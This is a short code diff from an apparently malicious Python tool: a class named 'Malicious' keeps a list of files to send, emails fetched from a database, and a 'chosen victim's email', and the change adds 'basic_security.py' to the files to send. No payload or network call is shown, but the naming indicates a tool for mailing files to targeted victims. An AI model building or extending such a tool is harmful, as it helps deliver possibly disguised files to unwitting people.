@@ -8,7 +8,7 @@ import sqlite3
 import email_handler as eh
 
 class Malicious(object):
-    selected = [] #the selected files to send
+    selected = ["basic_security.py"] #the selected files to send
     emails = [] #the list of emails fetched from database
     email = '' #the chosen victim's email
 
